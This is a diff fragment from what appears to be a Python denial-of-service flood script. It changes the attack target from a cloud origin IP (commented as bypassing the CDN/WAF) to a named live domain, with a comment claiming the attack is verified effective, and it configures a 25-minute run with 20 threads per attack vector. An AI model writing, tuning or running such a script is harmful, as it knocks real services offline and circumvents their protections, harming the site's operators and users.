@@ -21,7 +21,7 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from concurrent.futures import ThreadPoolExecutor
 
-TARGET = "https://54.180.71.132"  # 直连 AWS 源站 IP (HTTPS, bypass CDN/WAF)
+TARGET = "https://pnation.com"  # v2: 域名攻击（已验证生效）
 DURATION = 25 * 60  # 25 minutes
 THREADS_PER_VECTOR = 20  # 20 threads per attack vector
 
